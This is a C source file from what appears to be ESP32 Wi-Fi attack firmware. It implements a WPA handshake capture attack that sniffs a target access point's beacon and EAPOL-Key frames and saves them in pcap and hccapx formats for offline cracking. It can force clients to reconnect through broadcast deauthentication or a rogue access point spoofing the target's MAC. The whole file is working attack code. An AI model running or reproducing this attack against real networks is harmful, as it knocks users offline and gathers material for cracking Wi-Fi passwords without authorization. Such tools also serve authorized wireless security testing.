/**
 * @file attack_handshake.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-03
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements handshake attacks and different available methods.
 */

#include "attack_handshake.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_wifi_types.h"

#include "attack.h"
#include "attack_method.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "pcap_serializer.h"
#include "hccapx_serializer.h"

static const char *TAG = "main:attack_handshake";
static attack_handshake_methods_t method = -1;
static const wifi_ap_record_t *ap_record = NULL;

/**
 * @brief Callback for DATA_FRAME_EVENT_EAPOLKEY_FRAME event.
 * 
 * If EAPOL-Key frame is captured and DATA_FRAME_EVENT_EAPOLKEY_FRAME event is received from event pool, this method
 * appends the frame to status content and serialize them into pcap and hccapx format.
 * 
 * @param args not used
 * @param event_base expects FRAME_ANALYZER_EVENTS
 * @param event_id expects DATA_FRAME_EVENT_EAPOLKEY_FRAME
 * @param event_data expects wifi_promiscuous_pkt_t
 */
static bool handshake_done = false;
static bool beacon_captured = false;

static void beacon_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    if(beacon_captured) return;

    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
    
    // Check if it matches target BSSID (addr3 in 802.11 header for Beacons)
    if(memcmp(&frame->payload[16], ap_record->bssid, 6) == 0) {
        ESP_LOGI(TAG, "Captured Beacon/Probe for SSID identification");
        pcap_serializer_append_frame(frame->payload, frame->rx_ctrl.sig_len, frame->rx_ctrl.timestamp);
        beacon_captured = true;
        // Revert to only data frames to save processing
        wifictl_sniffer_filter_frame_types(true, false, false);
    }
}

static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    if(handshake_done) return; // Already captured, ignore further frames

    ESP_LOGI(TAG, "Got EAPoL-Key frame");
    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
    attack_append_status_content(frame->payload, frame->rx_ctrl.sig_len);
    pcap_serializer_append_frame(frame->payload, frame->rx_ctrl.sig_len, frame->rx_ctrl.timestamp);
    hccapx_serializer_add_frame((data_frame_t *) frame->payload);

    // If a valid handshake pair has been assembled, mark FINISHED
    if(hccapx_serializer_get() != NULL && !handshake_done) {
        handshake_done = true;
        ESP_LOGI(TAG, "Valid handshake assembled! Marking FINISHED.");
        attack_update_status(FINISHED);
        attack_handshake_stop();
    }
}

void attack_handshake_start(attack_config_t *attack_config){
    ESP_LOGI(TAG, "Starting handshake attack...");
    handshake_done = false;
    beacon_captured = false;
    method = attack_config->method;
    ap_record = attack_config->ap_record;
    pcap_serializer_init();
    hccapx_serializer_init(ap_record->ssid, strlen((char *)ap_record->ssid));
    
    // Listen for both Data (Handshake) and Mgmt (Beacon) initially
    wifictl_sniffer_filter_frame_types(true, true, false);
    wifictl_sniffer_start(ap_record->primary);
    frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);
    
    ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler, NULL));
    ESP_ERROR_CHECK(esp_event_handler_register(SNIFFER_EVENTS, SNIFFER_EVENT_CAPTURED_MGMT, &beacon_frame_handler, NULL));
    switch(attack_config->method){
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            ESP_LOGI(TAG, "Method: Broadcast Deauth (5000ms interval)");
            attack_method_broadcast(ap_record, 5000);
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            ESP_LOGI(TAG, "Method: Rogue AP");
            attack_method_rogueap(ap_record);
            break;
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            ESP_LOGI(TAG, "Method: Passive capture");
            break;
        default:
            ESP_LOGD(TAG, "Method unknown! Fallback to passive");
    }
}

void attack_handshake_stop(){
    switch(method){
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            // Restore management AP channel
            wifictl_mgmt_ap_start();
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            wifictl_mgmt_ap_start();
            break;
        default:
            ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
    }
    wifictl_sniffer_stop();
    frame_analyzer_capture_stop();
    esp_err_t err = esp_event_handler_unregister(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler);
    if (err != ESP_OK && err != ESP_ERR_NOT_FOUND) {
        ESP_ERROR_CHECK(err);
    }
    err = esp_event_handler_unregister(SNIFFER_EVENTS, SNIFFER_EVENT_CAPTURED_MGMT, &beacon_frame_handler);
    if (err != ESP_OK && err != ESP_ERR_NOT_FOUND) {
        ESP_ERROR_CHECK(err);
    }
    handshake_done = false;
    beacon_captured = false;
    ap_record = NULL;
    method = -1;
    ESP_LOGI(TAG, "Handshake attack stopped.");
}